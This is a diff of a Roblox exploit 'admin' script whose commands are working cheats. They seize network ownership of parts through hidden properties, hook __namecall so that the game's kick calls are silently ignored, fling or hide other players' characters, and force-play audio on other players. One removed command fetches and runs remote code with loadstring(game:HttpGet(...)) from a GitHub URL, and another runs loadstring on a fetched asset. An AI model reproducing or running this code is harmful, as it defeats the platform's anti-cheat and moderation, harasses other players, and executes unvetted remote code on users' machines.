+				Network["PartOwnership"]["PreMethodSettings"] = {}
+				for _,Part in pairs(Network["BaseParts"]) do
+					Network["RemovePart"](Part)
+				end
+				for Index,Part in pairs(Network["LostParts"]) do
+					table.remove(Network["LostParts"],Index)
+				end
+				Network["PartOwnership"]["Enabled"] = false
+				Network["Output"].Send(print,"PartOwnership Output : PartOwnership disabled.")
+			else
+				Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already disabled.")
+			end
+		end)
+
+		Network["Output"].Send(print,": Loaded.")
+	end
+	coroutine.resume(Network["PartOwnership"]["Enable"])
+
+
+	player = game:GetService("Players").LocalPlayer
+	camera = workspace.CurrentCamera
+	character = player.Character
+	local vbreak = false
+	character.Archivable = true
+
+	player.Character = nil
+	player.Character = character:Clone()
+
+	wait(game:GetService("Players").RespawnTime+.3)
+
+	character.Humanoid.Health = 0
+
+
+	stuff = Instance.new("Folder",workspace)
+	center = Instance.new("Part",stuff)
+	input = game:GetService("UserInputService")
+
+	center.Anchored = true
+	center.Size = Vector3.new(1,1,1)
+	center.Position = character.Head.Position
+	center.CanCollide = false
+	center.Transparency = 1
+
+	camera.CameraSubject = center
+
+	points = {}
+
+	last_pos = character.Head.Position
+	coroutine.wrap(function()
+		while task.wait() do
+			if vbreak == true then break end
+			center.CFrame = CFrame.new(center.Position) * camera.CFrame.Rotation
+			if (last_pos - center.Position).magnitude > 1 then
+				local marker = Instance.new("Part",stuff)
+				marker.Anchored = true
+				marker.Size = Vector3.new(1,1,1)
+				marker.CFrame = CFrame.lookAt(last_pos,center.Position)
+				marker.CanCollide = false
+				marker.Transparency = 1
+				last_pos = center.Position
+				table.insert(points,marker)
+			end
+			if points[#points-9] then
+				points[#points-9]:Destroy()
+				table.remove(points,#points-9)
 			end
 		end
+	end)()
+
+	handles = {}
+
+	for i,v in pairs(character:GetChildren()) do
+		if v:IsA("Accessory") then
+			table.insert(handles,v.Handle)
+		end
 	end
-	UnequipTools(GetHumanoid());
-	Utils.Notify(Caller, "Demeshtools", "Demeshed!")
+
+	for i,handle in pairs(handles) do
+		local number = i-1
+		handle.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
+		Network.RetainPart(handle)
+		coroutine.wrap(function()
+			while handle:FindFirstAncestor("Game") do
+				if points[#points-number] then do
+						handle.CFrame = points[#points-number].CFrame
+					end else
+					handle.CFrame = center.CFrame
+				end
+				task.wait()
+			end
+			vbreak = true
+			player.Character = character
+		end)()
+	end
+
+
+	current_position = character.Head.Position
+	wait(.5)
+	while wait() do
+		if vbreak == true then break end
+		if input:IsKeyDown(Enum.KeyCode.D) then
+			current_position += camera.CFrame.RightVector * speed
+		end
+		if input:IsKeyDown(Enum.KeyCode.A) then
+			current_position += camera.CFrame.RightVector * -speed
+		end
+		if input:IsKeyDown(Enum.KeyCode.W) then
+			current_position += camera.CFrame.LookVector * speed
+		end
+		if input:IsKeyDown(Enum.KeyCode.S) then
+			current_position += camera.CFrame.LookVector * -speed
+		end
+		if input:IsKeyDown(Enum.KeyCode.E) then
+			current_position += camera.CFrame.UpVector * speed
+		end
+		if input:IsKeyDown(Enum.KeyCode.Q) then
+			current_position += camera.CFrame.UpVector * -speed
+		end
+		if input:IsKeyDown(Enum.KeyCode.LeftShift) then do
+				speed = 1.5
+			end else
+			speed = 0.75
+		end
+		center.Position = current_position
+	end
 end)
 
 AddCommand("setfpscap", {"fpscap"}, "changes the fps to arg", {}, function(Caller, Args)
-        local fpscap = tonumber(Args[1])
-        setfpscap(fpscap)
-        Utils.Notify(Caller, "FPS", "Fps set to " .. fpscap)
+	local fpscap = tonumber(Args[1])
+	setfpscap(fpscap)
+	Utils.Notify(Caller, "FPS", "Fps set to " .. fpscap)
 end)
 
 AddCommand("shaders", {}, "enables roblox shaders", {}, function()
--- Roblox Graphics Enhancer
-local light = game.Lighting
-for i, v in pairs(light:GetChildren()) do
-	v:Destroy()
-end
+	-- Roblox Graphics Enhancer
+	local light = game.Lighting
+	for i, v in pairs(light:GetChildren()) do
+		v:Destroy()
+	end
 
-local ter = workspace.Terrain
-local color = Instance.new("ColorCorrectionEffect")
-local bloom = Instance.new("BloomEffect")
-local sun = Instance.new("SunRaysEffect")
-local blur = Instance.new("BlurEffect")
+	local ter = workspace.Terrain
+	local color = Instance.new("ColorCorrectionEffect")
+	local bloom = Instance.new("BloomEffect")
+	local sun = Instance.new("SunRaysEffect")
+	local blur = Instance.new("BlurEffect")
 
-color.Parent = light
-bloom.Parent = light
-sun.Parent = light
-blur.Parent = light
+	color.Parent = light
+	bloom.Parent = light
+	sun.Parent = light
+	blur.Parent = light
 
--- enable or disable shit
+	-- enable or disable shit
 
-local config = {
+	local config = {
 
-	Terrain = true;
-	ColorCorrection = true;
-	Sun = true;
-	Lighting = true;
-	BloomEffect = true;
-	
-}
+		Terrain = true;
+		ColorCorrection = true;
+		Sun = true;
+		Lighting = true;
+		BloomEffect = true;
 
--- settings {
+	}
 
-color.Enabled = false
-color.Contrast = 0.15
-color.Brightness = 0.1
-color.Saturation = 0.25
-color.TintColor = Color3.fromRGB(255, 222, 211)
-
-bloom.Enabled = false
-bloom.Intensity = 0.1
-
-sun.Enabled = false
-sun.Intensity = 0.2
-sun.Spread = 1
-
-bloom.Enabled = false
-bloom.Intensity = 0.05
-bloom.Size = 32
-bloom.Threshold = 1
-
-blur.Enabled = false
-blur.Size = 6
-
--- settings }
-
-
-if config.ColorCorrection then
-	color.Enabled = true
-end
-
-
-if config.Sun then
-	sun.Enabled = true
-end
-
-
-if config.Terrain then
 	-- settings {
-	ter.WaterColor = Color3.fromRGB(10, 10, 24)
-	ter.WaterWaveSize = 0.15
-	ter.WaterWaveSpeed = 22
-	ter.WaterTransparency = 1
-	ter.WaterReflectance = 0.05
+
+	color.Enabled = false
+	color.Contrast = 0.15
+	color.Brightness = 0.1
+	color.Saturation = 0.25
+	color.TintColor = Color3.fromRGB(255, 222, 211)
+
+	bloom.Enabled = false
+	bloom.Intensity = 0.1
+
+	sun.Enabled = false
+	sun.Intensity = 0.2
+	sun.Spread = 1
+
+	bloom.Enabled = false
+	bloom.Intensity = 0.05
+	bloom.Size = 32
+	bloom.Threshold = 1
+
+	blur.Enabled = false
+	blur.Size = 6
+
 	-- settings }
-end
 
 
-if config.Lighting then
-	-- settings {
-	light.Ambient = Color3.fromRGB(0, 0, 0)
-	light.Brightness = 4
-	light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
-	light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
-	light.ExposureCompensation = 0
-	light.FogColor = Color3.fromRGB(132, 132, 132)
-	light.GlobalShadows = true
-	light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
-	light.Outlines = false
-	-- settings }
-end
+	if config.ColorCorrection then
+		color.Enabled = true
+	end
+
+
+	if config.Sun then
+		sun.Enabled = true
+	end
+
+
+	if config.Terrain then
+		-- settings {
+		ter.WaterColor = Color3.fromRGB(10, 10, 24)
+		ter.WaterWaveSize = 0.15
+		ter.WaterWaveSpeed = 22
+		ter.WaterTransparency = 1
+		ter.WaterReflectance = 0.05
+		-- settings }
+	end
+
+
+	if config.Lighting then
+		-- settings {
+		light.Ambient = Color3.fromRGB(0, 0, 0)
+		light.Brightness = 4
+		light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+		light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
+		light.ExposureCompensation = 0
+		light.FogColor = Color3.fromRGB(132, 132, 132)
+		light.GlobalShadows = true
+		light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
+		light.Outlines = false
+		-- settings }
+	end
 end)
 
 AddCommand("gravity", {"grav"}, "changes the gravity to arg", {}, function(Caller, Args)
@@ -6109,31 +5195,6 @@ AddCommand("ignore", {}, "puts a players character in lighting", {}, function(Ca
 	end
 end)
 
-AddCommand("loopignore", {}, "loop of delete command", {}, function(Caller, Args, CEnv)
-	local Target = GetPlayer(Args[1]);
-	for i, v in next, Target do
-		if (v.Character) then
-			SpoofProperty(v.Character, "Parent");
-			v.Character.Parent = Lighting
-		end
-		local Connection = CConnect(v.CharacterAdded, function()
-			v.Character.Parent = Lighting
-		end)
-		CEnv[v.Name] = Connection
-		AddPlayerConnection(v, Connection);
-	end
-end)
-
-AddCommand("unloopignore", {}, "unloop the loopignore", {"1"}, function(Caller, Args)
-	local Target = GetPlayer(Args[1]);
-	local Looping = LoadCommand("loopignore").CmdEnv
-	for i, v in next, Target do
-		if (Looping[v.Name]) then
-			Disconnect(Looping[v.Name]);
-		end
-	end
-end)
-
 AddCommand("unignore", {"recover"}, "removes a players character parented from lighting", {"1"}, function(Caller, Args)
 	local Target = GetPlayer(Args[1]);
 	for i, v in next, Target do
@@ -6153,87 +5214,43 @@ AddCommand("sit", {}, "makes you sit", {3}, function(Caller, Args, CEnv)
 	Utils.Notify(Caller, "Sit", "Sitting!")
 end)
 
-AddCommand("antikillbrick", {}, "makes brick kills unable to kill", {3}, function()
-	local player = game:GetService("Players").LocalPlayer
-	local UIS = game:GetService("UserInputService")
-	local myzaza = false
-
-	UIS.InputBegan:Connect(function(input, GPE)
-		if GPE then return end
-		myzaza = not myzaza
-	end)
-
-	local parts = workspace:GetPartBoundsInRadius(player.Character:WaitForChild("HumanoidRootPart").Position, 10)
-	for _, part in ipairs(parts) do
-		part.CanTouch = myzaza
-	end
-	Utils.Notify(Caller, "Antikillbrick", "Enabled!")
-end)
-
-AddCommand("unantikillbrick", {}, "makes brick kills able to kill", {3}, function()
-	local player = game:GetService("Players").LocalPlayer
-	local UIS = game:GetService("UserInputService")
-	local myzaza = true
-
-	UIS.InputBegan:Connect(function(input, GPE)
-		if GPE then return end
-		myzaza = not myzaza
-	end)
-
-	local parts = workspace:GetPartBoundsInRadius(player.Character:WaitForChild("HumanoidRootPart").Position, 10)
-	for _, part in ipairs(parts) do
-		part.CanTouch = myzaza
-	end
-	Utils.Notify(Caller, "Antikillbrick", "Disabled!")
-end)
-
 AddCommand("anticlientkick", {"antickick"}, "disables client kick scripts", {}, function()
---// Cache
 
-local getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, stringlower = getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, string.lower
+	local getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, stringlower = getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, string.lower
 
---// Loaded check
+	if getgenv().ED_AntiKick then return end
+	local Players, StarterGui, OldNamecall = game:GetService("Players"), game:GetService("StarterGui")
+	getgenv().ED_AntiKick = {
+		SendNotifications = false, -- Set to true if you want to get notified for every event
+		CheckCaller = true -- Set to true if you want to disable kicking by other executed scripts
+	}
 
-if getgenv().ED_AntiKick then return end
 
---// Variables
+	OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(...)
+		if (getgenv().ED_AntiKick.CheckCaller and not checkcaller() or true) and stringlower(getnamecallmethod()) == "kick" then
+			if getgenv().ED_AntiKick.SendNotifications then
+				StarterGui:SetCore("SendNotification", {
+					Title = "Exunys Developer",
+					Text = "The script has successfully intercepted an attempted kick.",
+					Icon = "rbxassetid://6238540373",
+					Duration = 2,
+				})
+			end
 
-local Players, StarterGui, OldNamecall = game:GetService("Players"), game:GetService("StarterGui")
-
---// Global Variables
-
-getgenv().ED_AntiKick = {
-	SendNotifications = false, -- Set to true if you want to get notified for every event
-	CheckCaller = yes -- Set to true if you want to disable kicking by other executed scripts
-}
-
---// Main
-
-OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(...)
-	if (getgenv().ED_AntiKick.CheckCaller and not checkcaller() or true) and stringlower(getnamecallmethod()) == "kick" then
-		if getgenv().ED_AntiKick.SendNotifications then
-			StarterGui:SetCore("SendNotification", {
-				Title = "Exunys Developer",
-				Text = "The script has successfully intercepted an attempted kick.",
-				Icon = "rbxassetid://6238540373",
-				Duration = 2,
-			})
+			return nil
 		end
 
-		return nil
+		return OldNamecall(...)
+	end))
+
+	if getgenv().ED_AntiKick.SendNotifications then
+		StarterGui:SetCore("SendNotification", {
+			Title = "Exunys Developer",
+			Text = "Anti-Kick script loaded!",
+			Icon = "rbxassetid://6238537240",
+			Duration = 3,
+		})
 	end
-
-	return OldNamecall(...)
-end))
-
-if getgenv().ED_AntiKick.SendNotifications then
-	StarterGui:SetCore("SendNotification", {
-		Title = "Exunys Developer",
-		Text = "Anti-Kick script loaded!",
-		Icon = "rbxassetid://6238537240",
-		Duration = 3,
-	})
-end
 end)
 
 AddCommand("antikill", {}, "fakes your humanoid sit", {3}, function(Caller, Args, CEnv)
@@ -6476,7 +5493,7 @@ AddCommand("nighttime", {"night"}, "sets the games time to night", {}, function(
 	Utils.Notify(Caller, "Time", "Night!")
 end)
 
-AddCommand("masshatfling", {"mhatfling"}, "rescales your hat and fling", {4}, function()
+--[[AddCommand("masshatfling", {"mhatfling"}, "rescales your hat and fling", {4}, function()
 	local Settings = {
 		Values = {
 			BodyTypeScale = true;
@@ -6657,7 +5674,7 @@ AddCommand("hatfling", {}, "makes your hat able to fling", {}, function()
 		v.CanCollide = false
 	end
 	Utils.Notify(Caller, "Hatfling", "Loaded!")	
-end)
+end)--]]
 
 AddCommand("fling", {}, "flings a player", {}, function(Caller, Args)
 	local TargetPlayer = getplr(Args[1]);
@@ -6886,12 +5903,7 @@ AddCommand("fling", {}, "flings a player", {}, function(Caller, Args)
 	end
 end)
 
-AddCommand("rarmfling", {}, "fling with right arm", {2}, function()
-	if not getgenv()._reanimate then getgenv()._reanimate = loadstring(game:HttpGet('https://raw.githubusercontent.com/LighTMolT/wdawdv/main/uku.md'))() end
-	return getgenv()._reanimate()
-end)
-
-AddCommand("toolfling", {"tfling"}, "fling with tool", {}, function()    
+--[[AddCommand("toolfling", {"tfling"}, "fling with tool", {}, function()    
 	game:GetService("RunService").RenderStepped:wait()
 	local character = game.Players.LocalPlayer.Character
 	local Char = GetCharacter();
@@ -6976,7 +5988,7 @@ AddCommand("toolfling", {"tfling"}, "fling with tool", {}, function()
 		end
 	end)
 	Utils.Notify(Caller, "Toolfling", "Loaded!")	
-end)
+end)--]]
 
 AddCommand("reach", {"swordreach"}, "changes handle size of your tool", {1, 3}, function(Caller, Args, CEnv)
 	local Amount = Args[1] or 2
@@ -7254,44 +6266,6 @@ AddCommand("unaudiolag", {"noaudiolag"}, "unaudiolag a persons boombox", {}, fun
 			end
 		end
 	end
-end)
-
-AddCommand("forceplay", {"bplay"}, "forcesplays an audio", {1,3,"1"}, function(Caller, Args, CEnv)
-	local Id = Args[1]
-	local filterBoomboxes = function(i,v)
-		return IsA(v, "Tool") and FindFirstChild(v, "Handle") and FindFirstChildWhichIsA(v.Handle, "Sound");
-	end
-	UnequipTools(GetHumanoid());
-	local Boombox = filter(GetChildren(LocalPlayer.Backpack), filterBoomboxes)
-	if (not next(Boombox)) then
-		Utils.Notify(Caller, "Forceplay", "You need a boombox to forceplay!")	
-	end
-	Services.SoundService.RespectFilteringEnabled = false
-	Boombox = Boombox[1]
-	Boombox.Parent = GetCharacter();
-	local Sound = Boombox.Handle.Sound
-	Sound.SoundId = "http://roblox.com/asset/?id=" .. Id
-	local RemoteEvent = FindFirstChildWhichIsA(Boombox, "RemoteEvent")
-	RemoteEvent.FireServer(RemoteEvent, "PlaySong", tonumber(Id));
-	Boombox.Parent = LocalPlayer.Backpack
-	CEnv[Boombox] = true
-	CThread(function()
-		while (LoadCommand("forceplay").CmdEnv[Boombox]) do
-			Boombox.Handle.Sound.Playing = true
-			CWait(Heartbeat);
-		end
-		Services.SoundService.RespectFilteringEnabled = true
-	end)()
-	Utils.Notify(Caller, "Forceplay", "Now forceplaying ".. Id)	
-end)
-
-AddCommand("unforceplay", {"unbplay"}, "stops forceplay", {}, function()
-	local Playing = LoadCommand("forceplay").CmdEnv
-	for i, v in next, Playing do
-		FindFirstChild(i, "Sound", true).Playing = false
-		LoadCommand("forceplay").CmdEnv[i] = false
-	end
-	Utils.Notify(Caller, "Forceplay", "Disabled!")
 end)
 
 AddCommand("checksound", {}, "checks if sound can be played  ", {}, function()
@@ -7597,673 +6571,378 @@ AddCommand("chatlogs", {"logs"}, "enables chatlogs", {}, function()
 end)
 
 AddCommand("f3x", {}, "gives f3x item", {}, function()
-loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
+	loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
 end)
 
-AddCommand("btools", {}, "gives you btools for accessories", {3}, function(Caller, Args)
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
-
-if not getgenv().Network then
-	getgenv().Network = {
-		BaseParts = {};
-		FakeConnections = {};
-		Connections = {};
-		Output = {
-			Enabled = true;
-			Prefix = "[NETWORK] ";
-			Send = function(Type,Output,BypassOutput)
-				if typeof(Type) == "function" and (Type == print or Type == warn or Type == error) and typeof(Output) == "string" and (typeof(BypassOutput) == "nil" or typeof(BypassOutput) == "boolean") then
-					if Network["Output"].Enabled == true or BypassOutput == true then
-						Type(Network["Output"].Prefix..Output);
-					end;
-				elseif Network["Output"].Enabled == true then
-					error(Network["Output"].Prefix.."Output Send Error : Invalid syntax.");
-				end;
-			end;
-		};
-		CharacterRelative = false;
-	}
-
-	Network["Output"].Send(print,": Loading.")
-	Network["Velocity"] = Vector3.new(14.46262424,14.46262424,14.46262424); --exactly 25.1 magnitude
-	Network["RetainPart"] = function(Part,ReturnFakePart) --function for retaining ownership of unanchored parts
-		assert(typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(workspace),Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg1 (Part) must be a BasePart which is a descendant of workspace.")
-		assert(typeof(ReturnFakePart) == "boolean" or typeof(ReturnFakePart) == "nil",Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg2 (ReturnFakePart) must be a boolean or nil.")
-		if not table.find(Network["BaseParts"],Part) then
-			if Network.CharacterRelative == true then
-				local Character = LocalPlayer.Character
-				if Character and Character.PrimaryPart then
-					local Distance = (Character.PrimaryPart.Position-Part.Position).Magnitude
-					if Distance > 1000 then
-						Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
-						return false
-					end
-				else
-					Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
-					return false
-				end
-			end
-			table.insert(Network["BaseParts"],Part)
-			Part.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
-			Network["Output"].Send(print,"PartOwnership Output : PartOwnership applied to BasePart "..Part:GetFullName()..".")
-			if ReturnFakePart == true then
-				return FakePart
-			end
-		else
-			Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it already active.")
-			return false
-		end
-	end
-
-	Network["RemovePart"] = function(Part) --function for removing ownership of unanchored part
-		assert(typeof(Part) == "Instance" and Part:IsA("BasePart"),Network["Output"].Prefix.."RemovePart Error : Invalid syntax: Arg1 (Part) must be a BasePart.")
-		local Index = table.find(Network["BaseParts"],Part)
-		if Index then
-			table.remove(Network["BaseParts"],Index)
-			Network["Output"].Send(print,"RemovePart Output: PartOwnership removed from BasePart "..Part:GetFullName()..".")
-		else
-			Network["Output"].Send(warn,"RemovePart Warning : BasePart "..Part:GetFullName().." not found in BaseParts table.")
-		end
-	end
-
-	Network["SuperStepper"] = Instance.new("BindableEvent") --make super fast event to connect to
-	for _,Event in pairs({RunService.Stepped,RunService.Heartbeat}) do
-		Event:Connect(function()
-			return Network["SuperStepper"]:Fire(Network["SuperStepper"],tick())
-		end)
-	end
-
-	Network["PartOwnership"] = {};
-	Network["PartOwnership"]["PreMethodSettings"] = {};
-	Network["PartOwnership"]["Enabled"] = false;
-	Network["PartOwnership"]["Enable"] = coroutine.create(function() --creating a thread for network stuff
-		if Network["PartOwnership"]["Enabled"] == false then
-			Network["PartOwnership"]["Enabled"] = true --do cool network stuff before doing more cool network stuff
-			Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus = LocalPlayer.ReplicationFocus
-			LocalPlayer.ReplicationFocus = workspace
-			Network["PartOwnership"]["PreMethodSettings"].SimulationRadius = gethiddenproperty(LocalPlayer,"SimulationRadius")
-			Network["PartOwnership"]["Connection"] = Network["SuperStepper"].Event:Connect(function() --super fast asynchronous loop
-				sethiddenproperty(LocalPlayer,"SimulationRadius",1/0)
-				for _,Part in pairs(Network["BaseParts"]) do --loop through parts and do network stuff
-					coroutine.wrap(function()
-						if Part:IsDescendantOf(workspace) then
-							if Network.CharacterRelative == true then
-								local Character = LocalPlayer.Character;
-								if Character and Character.PrimaryPart then
-									local Distance = (Character.PrimaryPart.Position - Part.Position).Magnitude
-									if Distance > 1000 then
-										Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
-										Lost = true;
-										Network["RemovePart"](Part)
-									end
-								else
-									Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
-								end
-							end
-							Part.Velocity = Network["Velocity"]+Vector3.new(0,math.cos(tick()*10)/100,0) --keep network by sending physics packets of 30 magnitude + an everchanging addition in the y level so roblox doesnt get triggered and fuck your ownership
-						else
-							Network["RemovePart"](Part)
-						end
-					end)()
-				end
-			end)
-			Network["Output"].Send(print,"PartOwnership Output : PartOwnership enabled.")
-		else
-			Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already enabled.")
-		end
-	end)
-	Network["PartOwnership"]["Disable"] = coroutine.create(function()
-		if Network["PartOwnership"]["Connection"] then
-			Network["PartOwnership"]["Connection"]:Disconnect()
-			LocalPlayer.ReplicationFocus = Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus
-			sethiddenproperty(LocalPlayer,"SimulationRadius",Network["PartOwnership"]["PreMethodSettings"].SimulationRadius)
-			Network["PartOwnership"]["PreMethodSettings"] = {}
-			for _,Part in pairs(Network["BaseParts"]) do
-				Network["RemovePart"](Part)
-			end
-			Network["PartOwnership"]["Enabled"] = false
-			Network["Output"].Send(print,"PartOwnership Output : PartOwnership disabled.")
-		else
-			Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already disabled.")
-		end
-	end)
-	Network["Output"].Send(print,": Loaded.")
-end
-
-coroutine.resume(Network["PartOwnership"]["Enable"])
-
-player = game:GetService("Players").LocalPlayer
-Gui = player.PlayerGui
-Backpack = player.Backpack
-Mouse = player:GetMouse()
-
-Parts_Folder = Instance.new("Folder",workspace)
-
-for i, Hat in pairs(player.Character:GetChildren()) do
-	if Hat:IsA("Accessory") then
-		local Part = Instance.new("Part",Parts_Folder)
-		Part.Name = Hat.Name
-		Part.Anchored = true
-		Part.Size = Hat.Handle.Size
-		Part.Position = player.Character.Head.Position + Vector3.new(math.random(-5,5),math.random(-1,1),math.random(-5,5))
-		Part:SetAttribute("Moveable",true)
-		Part.Material = Enum.Material.SmoothPlastic
-		Part.CanCollide = false
-        Part.Color = Color3.new(1,0,0)
-	end
-end
-
-
-Move_Tool = Instance.new("Tool",Backpack)
-Rotate_Tool = Instance.new("Tool",Backpack)
-MHandle = Instance.new("Part",Move_Tool)
-RHandle = Instance.new("Part",Rotate_Tool)
-Mgrabs = Instance.new("Handles",Gui)
-Rgrabs = Instance.new("ArcHandles",Gui)
-Outline = Instance.new("Highlight")
-
-Move_Tool.Name = "Move"
-Move_Tool.CanBeDropped = false
-
-Rotate_Tool.Name = "Rotate"
-Rotate_Tool.CanBeDropped = false
-
-MHandle.Name = "Handle"
-MHandle.Transparency = 1
-
-RHandle.Name = "Handle"
-RHandle.Transparency = 1
-
-Mgrabs.Visible = false
-Mgrabs.Color3 = Color3.fromRGB(248, 236, 0)
-Mgrabs.Style = "Movement"
-
-Rgrabs.Visible = false
-
-Outline.FillTransparency = 1
-Outline.OutlineTransparency = 0
-
-Active_Part = nil
-
-Move_Tool.Equipped:Connect(function()
-	if Active_Part ~= nil then
-		Mgrabs.Visible = true
-		Mgrabs.Adornee = Active_Part
-	end
-end)
-
-Move_Tool.Unequipped:Connect(function()
-	Mgrabs.Visible = false
-	Mgrabs.Adornee = nil
-end)
-
-Move_Tool.Activated:Connect(function()
-	if Mouse.Target:GetAttribute("Moveable") then
-		Active_Part = Mouse.Target
-		Mgrabs.Visible = true
-		Mgrabs.Adornee = Active_Part
-		Outline.Parent = Active_Part
-	end
-end)
-
-Rotate_Tool.Equipped:Connect(function()
-	if Active_Part ~= nil then
-		Rgrabs.Visible = true
-		Rgrabs.Adornee = Active_Part
-	end
-end)
-
-Rotate_Tool.Unequipped:Connect(function()
-	Rgrabs.Visible = false
-	Rgrabs.Adornee = nil
-end)
-
-Rotate_Tool.Activated:Connect(function()
-	if Mouse.Target:GetAttribute("Moveable") then
-		Active_Part = Mouse.Target
-		Rgrabs.Visible = true
-		Rgrabs.Adornee = Active_Part
-		Outline.Parent = Active_Part
-	end
-end)
-
-MOGCFrame = CFrame.new()
-
-Mgrabs.MouseButton1Down:Connect(function()
-	MOGCFrame = Active_Part.CFrame
-end)
-
-Mgrabs.MouseDrag:Connect(function(knob, pos)
-	if knob == Enum.NormalId.Front then
-		Active_Part.CFrame = MOGCFrame + MOGCFrame.LookVector * pos
-	end
-	if knob == Enum.NormalId.Back then
-		Active_Part.CFrame = MOGCFrame + MOGCFrame.LookVector * -pos
-	end
-	if knob == Enum.NormalId.Top then
-		Active_Part.CFrame = MOGCFrame + MOGCFrame.UpVector * pos
-	end
-	if knob == Enum.NormalId.Bottom then
-		Active_Part.CFrame = MOGCFrame + MOGCFrame.UpVector * -pos
-	end
-	if knob == Enum.NormalId.Left then
-		Active_Part.CFrame = MOGCFrame + MOGCFrame.RightVector * -pos
-	end
-	if knob == Enum.NormalId.Right then
-		Active_Part.CFrame = MOGCFrame + MOGCFrame.RightVector * pos
-	end
-end)
-
-ROGCFrame = CFrame.new()
-
-Rgrabs.MouseButton1Down:Connect(function()
-	ROGCFrame = Active_Part.CFrame
-end)
-
-Rgrabs.MouseDrag:Connect(function(knob, angle)
-	if knob == Enum.Axis.Y then
-		Active_Part.CFrame = ROGCFrame * CFrame.Angles(0,angle,0)
-	end
-	if knob == Enum.Axis.X then
-		Active_Part.CFrame = ROGCFrame * CFrame.Angles(angle,0,0)
-	end
-	if knob == Enum.Axis.Z then
-		Active_Part.CFrame = ROGCFrame * CFrame.Angles(0,0,angle)
-	end
-end)
-
-HRP = player.Character.HumanoidRootPart
-
-for i, Part in pairs(Parts_Folder:GetChildren()) do
-	local Hat = player.Character[Part.Name].Handle
-	Hat.AccessoryWeld:Destroy()
-    Network.RetainPart(Hat)
-	local vbreak = false
-	coroutine.wrap(function()
-		while task.wait() do
-			if vbreak == true then break end
-			Hat.CFrame = Part.CFrame
-		end
-	end)()
-	Hat:FindFirstChildWhichIsA("SpecialMesh"):Destroy()
-end
-
-player.Character.Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
-	Parts_Folder:Destroy()
-end)
-end)
-
-
-AddCommand("btoolscollision", {}, "gives you btools for accessories with collision", {3}, function(Caller, Args)	
+AddCommand("btools", {}, "gives you btools for accessories", {3}, function(Caller, Args)	
 	local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
+	local RunService = game:GetService("RunService")
+	local LocalPlayer = Players.LocalPlayer
 
-if not getgenv().Network then
-	getgenv().Network = {
-		BaseParts = {};
-		FakeConnections = {};
-		Connections = {};
-		Output = {
-			Enabled = true;
-			Prefix = "[NETWORK] ";
-			Send = function(Type,Output,BypassOutput)
-				if typeof(Type) == "function" and (Type == print or Type == warn or Type == error) and typeof(Output) == "string" and (typeof(BypassOutput) == "nil" or typeof(BypassOutput) == "boolean") then
-					if Network["Output"].Enabled == true or BypassOutput == true then
-						Type(Network["Output"].Prefix..Output);
+	if not getgenv().Network then
+		getgenv().Network = {
+			BaseParts = {};
+			FakeConnections = {};
+			Connections = {};
+			Output = {
+				Enabled = true;
+				Prefix = "[NETWORK] ";
+				Send = function(Type,Output,BypassOutput)
+					if typeof(Type) == "function" and (Type == print or Type == warn or Type == error) and typeof(Output) == "string" and (typeof(BypassOutput) == "nil" or typeof(BypassOutput) == "boolean") then
+						if Network["Output"].Enabled == true or BypassOutput == true then
+							Type(Network["Output"].Prefix..Output);
+						end;
+					elseif Network["Output"].Enabled == true then
+						error(Network["Output"].Prefix.."Output Send Error : Invalid syntax.");
 					end;
-				elseif Network["Output"].Enabled == true then
-					error(Network["Output"].Prefix.."Output Send Error : Invalid syntax.");
 				end;
-			end;
-		};
-		CharacterRelative = false;
-	}
+			};
+			CharacterRelative = false;
+		}
 
-	Network["Output"].Send(print,": Loading.")
-	Network["Velocity"] = Vector3.new(14.46262424,14.46262424,14.46262424); --exactly 25.1 magnitude
-	Network["RetainPart"] = function(Part,ReturnFakePart) --function for retaining ownership of unanchored parts
-		assert(typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(workspace),Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg1 (Part) must be a BasePart which is a descendant of workspace.")
-		assert(typeof(ReturnFakePart) == "boolean" or typeof(ReturnFakePart) == "nil",Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg2 (ReturnFakePart) must be a boolean or nil.")
-		if not table.find(Network["BaseParts"],Part) then
-			if Network.CharacterRelative == true then
-				local Character = LocalPlayer.Character
-				if Character and Character.PrimaryPart then
